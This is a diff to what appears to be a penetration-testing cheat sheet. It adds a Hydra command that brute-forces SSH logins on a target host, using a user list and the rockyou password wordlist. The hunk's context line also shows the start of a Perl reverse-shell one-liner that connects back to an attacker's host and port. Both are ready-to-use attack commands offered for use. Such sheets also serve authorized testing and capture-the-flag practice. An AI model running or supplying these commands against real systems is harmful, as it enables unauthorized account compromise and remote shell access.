@@ -123,3 +123,5 @@ perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyn
 ## Bruteforce
 ### John the ripper
 ### Hydra
+bruteforce ssh login :  
+`hydra -L user.txt -P /usr/share/wordlists/rockyou.txt RHOST -t 5 ssh -I`
